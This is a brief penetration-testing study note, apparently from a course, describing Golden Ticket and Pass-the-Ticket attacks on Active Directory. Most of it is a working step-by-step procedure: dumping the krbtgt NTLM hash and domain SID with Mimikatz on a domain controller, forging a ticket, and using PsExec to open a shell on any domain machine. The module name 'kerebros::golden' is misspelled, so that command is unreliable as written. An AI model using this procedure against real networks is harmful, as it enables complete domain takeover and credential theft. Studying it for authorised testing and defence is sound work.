---
tags:
  - PEH
---
## Definition
Golden Ticket Attacks allow you to have the complete access to every machine in the domain since the compromised `krbtgt` account allows you to have access to any system or resource in the domain (you own the place that distributes tickets!).

The tickets can be generated once we have the SID and `krbtgt`hash.
## Executing Golden Ticket and Pass the Ticket Attacks
1. Transfer Mimikatz to the DC and run it using a privileged PowerShell
2. Enter debug mode `privilege::debug`
3. Run `lsadump::lsa /inject /name:krbtgt`
4. Keep the following
	1. The SID of the domain, and it should look like this `S-1-5-21-1560779125-3848459138-2476674860`
	2. The primary NTLM hash of `krbtgt` account
5. Now we have all of the requirements (SID and NTLM hash), we can perform the attacks using the following command
```bash
mimikatz # kerebros::golden /User:<real-user> /domain:<domain> /sid:<sid> /krbtgt:<krbtgt-NTLM-hash> /id:500 /ptt
```
6. Run `misc::cmd` and now you have a ticket in the current CMD session for any system or resource in the domain!
	1. From there, you can DO EVERYTHING YOU WANT TO ANY RESOURCE OR MACHINE. For example if you want to pop a shell, download PsExec.exe and run the following command `psexec.exe \\<pc-name(not-username)>` cmd.exe